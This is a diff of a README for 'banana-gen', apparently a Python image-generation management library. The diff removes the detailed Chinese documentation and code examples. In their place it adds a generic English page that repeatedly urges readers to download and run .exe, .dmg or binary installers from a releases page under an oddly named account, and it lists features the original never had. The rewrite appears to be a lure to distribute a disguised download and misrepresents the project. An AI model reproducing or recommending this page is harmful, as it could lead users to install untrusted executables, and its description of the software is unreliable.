@@ -1,353 +1,95 @@
-# Banana Gen
+# 🍌 banana-gen - Simplify Your Image Generation Process
 
-> 统一的图像生成管理框架
+## 🚀 Getting Started
+Welcome to the banana-gen project! This tool helps you manage and generate images easily. Whether you need to handle prompts, keys, or tasks, banana-gen makes the process straightforward. 
 
-## 🚀 核心功能
+## 📥 Download & Install
+To get started, you need to download the software. You can do this by visiting the Releases page:
 
-### 🔑 智能 Key 管理
-- **多级优先级** key 池自动管理
-- **故障自动转移** 和冷却恢复
-- **负载均衡** 轮换使用
-- **线程安全** 并发支持
+[![Download banana-gen](https://img.shields.io/badge/Download-banana--gen-blue)](https://github.com/Yourmothegotboobs/banana-gen/releases)
 
-### 📝 统一 Prompt 管理
-- **Prompt 类**：结构化管理（ID、文本、输入数量、标签）
-- **按输入图数量分类**：0/1/2/3 输入图场景
-- **JSON 格式** 注册表，易于管理
-- **通过 ID 使用**：`registry.get_prompts_by_ids(["p2_change_people"])`
+Click the link above to visit the page, and find the version suitable for your system.
 
-### 🖼️ 灵活图片来源系统
-- **多种图片类型**：支持本地图片、网络图片、文件夹、生成任务等
-- **自动路径回退**：主路径失败时自动尝试备用路径
-- **状态管理**：有效/失效/待定状态跟踪
-- **滑动窗口**：支持批量处理和序列化处理
+### Steps to Download:
+1. **Visit the Releases page:** Click [here](https://github.com/Yourmothegotboobs/banana-gen/releases).
+2. **Find the latest version:** Look for the most recent release listed on the page.
+3. **Select the correct file:** Choose the file that matches your operating system (for example, Windows, macOS, or Linux).
+4. **Click to download:** Click the file link to start the download.
 
-### 📁 智能输出管理
-- **三种路径策略**：统一/分路径/子目录
-- **自定义文件名**：支持占位符模板
-- **冲突处理**：自动生成唯一文件名
-- **元数据嵌入**：PNG 私有 chunk（不可被其他软件读取）
+## 💻 System Requirements
+Before installing banana-gen, ensure your computer meets the following requirements:
 
-### 📊 完整日志系统
-- **双重输出**：控制台 + 文件
-- **结构化日志**：JSONL 格式
-- **线程安全**：支持高并发
-- **详细记录**：Key 使用、文件保存、错误信息
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Storage Space:** Minimum of 100 MB free space for the application and additional space for generated images.
+- **Internet Connection:** Required for initial setup and updates.
 
-### 🎯 任务管理器
-- **一键运行**：`task_manager.run_with_interactive_monitoring()`
-- **动态任务生成**：避免内存溢出
-- **实时进度监控**：显示完成状态、错误信息
-- **自动负载均衡**：根据生成器空闲容量调度任务
+## 🔧 Installation Steps
+After downloading, follow these instructions to install banana-gen on your computer:
 
-## 🖼️ 图片类型详解
+### For Windows:
+1. Locate the downloaded file (usually in your Downloads folder).
+2. Double-click the `.exe` file to start the installation.
+3. Follow the prompts in the installer.
+4. Choose the installation location or go with the default.
+5. Click "Install" and wait for the process to complete.
+6. Once installed, you can find banana-gen in your Start menu.
 
-### SingleImage 类型（单个图片）
+### For macOS:
+1. Open the downloaded `.dmg` file.
+2. Drag the banana-gen icon into the Applications folder.
+3. Eject the disk image.
+4. Open Applications and find banana-gen to run it.
 
-#### 1. ImageData - 图片数据
-```python
-# 直接使用图片字节数据
-image_data = ImageData(data=bytes_data, format="PNG")
-```
+### For Linux:
+1. Open a terminal.
+2. Navigate to the directory where the file was downloaded.
+3. Use the following command to extract the files:
+   ```
+   tar -xvf banana-gen-x.x.x.tar.gz
+   ```
+4. Navigate to the extracted folder:
+   ```
+   cd banana-gen-x.x.x
+   ```
+5. Run the application using:
+   ```
+   ./banana-gen
+   ```
 
-#### 2. LocalImage - 本地图片文件
-```python
-# 配置方式
-input_configs = [
-    {
-        "type": "local_image",
-        "main_path": "/path/to/main/image.jpg",
-        "fallback_paths": ["/backup/image1.jpg", "/backup/image2.jpg"]
-    }
-]
-```
+## 🌟 Features
+Banana Gen offers a unique set of features to manage your image generation tasks:
 
-#### 3. UrlImage - 网络图片
-```python
-# 配置方式
-input_configs = [
-    {
-        "type": "url_image", 
-        "main_path": "https://example.com/image.jpg",
-        "fallback_paths": ["https://backup.com/image1.jpg", "https://backup.com/image2.jpg"]
-    }
-]
-```
+- **Intelligent Key Management:** Easily manage and secure your API keys.
+- **Prompt Management:** Organize and track prompts for efficient generation.
+- **Flexible Image Sources:** Choose from various sources for generating images.
+- **Task Scheduler:** Automate your image generation with a built-in scheduler.
+- **Web UI:** Use a user-friendly web interface to manage all your tasks seamlessly.
+- **Nested Workflows:** Handle complex processes with ease, ensuring smooth operations.
+- **Batch Processing:** Generate multiple images at once to save time.
 
-#### 4. ImageGenerateTask - 图片生成任务
-```python
-# 直接创建（用于复杂场景）
-from banana_gen import ImageGenerateTask, LocalImage
+## 📚 Usage Guide
+Once you have installed banana-gen, follow these steps to start generating images:
 
-# 创建输入图片列表
-input_images = [LocalImage("/path/to/image1.jpg"), LocalImage("/path/to/image2.jpg")]
-# 创建生成任务
-task = ImageGenerateTask(input_images, "your prompt text")
-# 执行任务
-success = task.execute(generator)
-```
+1. **Open the application:** Launch banana-gen from your Start menu or Applications folder.
+2. **Set up your keys:** Navigate to the Key Management section to input your API keys.
+3. **Create and manage prompts:** Use the Prompt Management interface to create new prompts or edit existing ones.
+4. **Select your image sources:** Choose where banana-gen should pull images from.
+5. **Schedule tasks:** Go to the Scheduler section to set up automated tasks.
+6. **Monitor progress:** Use the built-in tools to keep track of your image generation tasks.
 
-### ImageList 类型（图片列表）
+## 📞 Support
+If you encounter any issues or have questions, you can reach out for help. Visit the Issues page in this repository to report problems or find solutions.
 
-#### 1. ImageFolder - 本地文件夹
-```python
-# 配置方式
-input_configs = [
-    {
-        "type": "folder",
-        "main_path": "/path/to/main/folder",
-        "fallback_paths": ["/backup/folder1", "/backup/folder2"]
-    }
-]
-```
+## 🔗 Connect with the Community
+Join our community to share ideas and get updates. You can find more resources and discussions on our project's GitHub page.
 
-#### 2. ImageRecursionFolder - 递归文件夹
-```python
-# 配置方式
-input_configs = [
-    {
-        "type": "recursive_folder",
-        "main_path": "/path/to/main/folder",
-        "fallback_paths": ["/backup/folder1", "/backup/folder2"]
-    }
-]
-```
+## 📥 Download Again
+To download banana-gen again, you can use this link to revisit the Releases page:
 
-#### 3. ImageGenerateTasks - 生成任务列表
-```python
-# 直接创建（用于批量生成任务管理）
-from banana_gen import ImageGenerateTasks, ImageGenerateTask
+[![Download banana-gen](https://img.shields.io/badge/Download-banana--gen-blue)](https://github.com/Yourmothegotboobs/banana-gen/releases)
 
-# 创建多个生成任务
-tasks = [
-    ImageGenerateTask([img1, img2], "prompt1"),
-    ImageGenerateTask([img3, img4], "prompt2")
-]
-# 创建任务列表
-task_list = ImageGenerateTasks(tasks)
-```
+## 📝 Changelog
+Check the Releases section for updates and a list of new features or fixes in each version. Stay up to date with the latest improvements to enhance your user experience.
 
-## 🎯 使用场景
-
-### 场景1：超级简化使用（推荐）
-```python
-from banana_gen import TaskManager, UnifiedImageGenerator, PromptRegistry
-
-# 1. 初始化
-generator = UnifiedImageGenerator(max_workers=2)
-registry = PromptRegistry()
-
-# 2. 配置输入图片
-input_configs = [
-    {
-        "type": "folder",
-        "main_path": "/path/to/pose/images",
-        "fallback_paths": ["backup/poses"]
-    },
-    {
-        "type": "local_image",
-        "main_path": "/path/to/character.jpg", 
-        "fallback_paths": ["backup/character.jpg"]
-    }
-]
-
-# 3. 通过 ID 获取 prompts
-prompts = registry.get_prompts_by_ids(["p2_change_people"])
-
-# 4. 创建任务管理器
-task_manager = TaskManager.create_with_auto_fallback(
-    generator=generator,
-    input_configs=input_configs,
-    prompts=prompts,
-    string_replace_list=[["photorealistic", "cartoon", "anime"]]
-)
-
-# 5. 一键运行
-success = task_manager.run_with_interactive_monitoring()
-```
-
-### 场景2：混合图片类型
-```python
-input_configs = [
-    {
-        "type": "folder",  # 文件夹中的图片
-        "main_path": "/path/to/poses",
-        "fallback_paths": ["backup/poses"]
-    },
-    {
-        "type": "url_image",  # 网络图片
-        "main_path": "https://example.com/character.jpg",
-        "fallback_paths": ["https://backup.com/character.jpg"]
-    },
-    {
-        "type": "local_image",  # 本地固定图片
-        "main_path": "/path/to/style.jpg",
-        "fallback_paths": ["backup/style.jpg"]
-    }
-]
-```
-
-### 场景3：高级用法 - 直接使用图片类
-```python
-from banana_gen import (
-    ImageFolder, LocalImage, UrlImage, ImageGenerateTask,
-    TaskManager, UnifiedImageGenerator
-)
-
-# 直接创建图片对象
-input_images = [
-    ImageFolder("/path/to/poses", fallback_paths=["backup/poses"]),
-    LocalImage("/path/to/character.jpg", fallback_paths=["backup/character.jpg"]),
-    UrlImage("https://example.com/style.jpg", fallback_urls=["https://backup.com/style.jpg"])
-]
-
-# 创建任务管理器
-task_manager = TaskManager(
-    generator=generator,
-    input_images=input_images,  # 直接传入图片对象
-    prompts=["p2_change_people"],
-    string_replace_list=[["photorealistic", "cartoon", "anime"]]
-)
-```
-
-## ⚡ 技术优势
-
-- **完全线程安全**：支持高并发处理
-- **无侵入式重构**：不修改原代码
-- **生产就绪**：错误处理、重试机制、状态持久化
-- **高度可配置**：路径策略、文件名模板、元数据等
-- **智能冲突处理**：文件名冲突自动解决
-- **内存优化**：动态任务生成，避免内存溢出
-- **自动回退**：路径失败时自动尝试备用路径
-
-## 📋 快速开始
-
-### 1. 安装依赖
-```bash
-python example/install_dependencies.py
-```
-
-### 2. 配置 Keys
-```bash
-# 创建 key 文件
-mkdir banana_gen/keys
-echo "your_api_key_1" > banana_gen/keys/api_keys_1.txt
-echo "your_api_key_2" > banana_gen/keys/api_keys_2.txt
-```
-
-### 3. 运行演示
-```bash
-# 超级简化演示（推荐）
-python example/demo_ultra_simple.py
-
-# 简化任务管理器演示
-python example/demo_simple_task_manager.py
-
-# 任务管理器测试
-python example/demo_task_manager_test.py
-```
-
-## 🎮 Demo 程序
-
-### 1. `demo_ultra_simple.py` - 超级简化演示（最推荐）
-只需要几行代码就能完成复杂的图片生成任务：
-
-**功能特点：**
-- 一键创建任务管理器，自动处理路径回退
-- 一键运行，包含用户确认、进度监控、结果显示
-- 动态任务生成和调度
-- 内存优化（避免一次性生成所有任务）
-- 支持多种输入图片类型（文件夹、固定图片、URL图片）
-- 字符串替换功能（类似原始代码的 STRING_REPLACE_LIST）
-- 任务状态监控（开始/暂停/停止/完成）
-- 实时进度显示
-- 自动负载均衡和并发控制
-
-**使用方法：**
-```bash
-# 1. 安装依赖
-python example/install_dependencies.py
-
-# 2. 运行 demo
-python example/demo_ultra_simple.py
-```
-
-### 2. `demo_simple_task_manager.py` - 简化任务管理器演示
-展示使用便捷方法创建任务管理器，通过 ID 使用 prompts：
-
-**功能特点：**
-- 通过 ID 从注册表获取 Prompt 对象
-- 一键创建任务管理器，自动处理路径回退
-- 一键运行，包含用户确认、进度监控、结果显示
-- 支持多种输入图片类型
-- 字符串替换功能
-
-### 3. `demo_task_manager_test.py` - 任务管理器测试程序
-仿照原始代码的结构，使用新的任务管理器进行测试：
-
-**功能特点：**
-- 通过 ID 从注册表获取 Prompt 对象
-- 完整的任务管理器功能测试
-- 支持复杂的输入配置
-- 详细的测试日志
-
-### 4. 测试程序
-- `test_prompt_system.py` - Prompt 系统测试
-- `test_prompt_by_id.py` - ID 方式测试
-
-## 📚 文件结构
-
-```
-banana-gen/
-├── banana_gen/                    # 核心包
-│   ├── images/                   # 图片管理系统
-│   │   ├── base.py              # 基础类定义
-│   │   ├── single.py            # 单个图片类
-│   │   └── lists.py             # 图片列表类
-│   ├── prompts/                 # Prompt 管理系统
-│   │   ├── prompt.py            # Prompt 类
-│   │   ├── registry.py          # Prompt 注册表
-│   │   └── replace.py           # 字符串替换
-│   ├── executor/                # 执行器
-│   │   ├── google_api_manager.py # 统一图片生成器
-│   │   └── task_manager.py      # 任务管理器
-│   ├── keys/                    # Key 管理
-│   └── output/                  # 输出管理
-├── promptfiles/                     # Prompt 文件目录 (从 prompts/ 重命名)
-├── example/                     # 示例程序
-│   ├── demo_ultra_simple.py     # 超级简化演示
-│   ├── demo_simple_task_manager.py # 简化演示
-│   └── install_dependencies.py  # 依赖安装
-└── README.md                    # 说明文档
-```
-
-## ⚠️ 重要说明
-
-- **不修改原代码**：完全独立于 aistdio-banana
-- **需要 API Key**：需要有效的 Google API Key
-- **线程安全**：支持高并发处理
-- **自动处理**：文件名冲突、Key 失效、状态持久化
-- **路径回退**：自动尝试备用路径，提高容错性
-- **内存优化**：动态任务生成，支持大规模处理
-
-## 🔧 高级配置
-
-### 自定义文件名模板
-```python
-filename_template = "{base}-{prompt_idx}-{replace_idx}-{image_idx}-{timestamp}.png"
-```
-
-### 自定义输出目录
-```python
-output_dir = "custom/output/directory"
-```
-
-### 自定义并发数
-```python
-generator = UnifiedImageGenerator(max_workers=5)  # 5个并发
-```
-
-### 自定义重试次数
-```python
-generator = UnifiedImageGenerator(max_retries=5)  # 5次重试
-```
+Enjoy using banana-gen, and happy image generating!
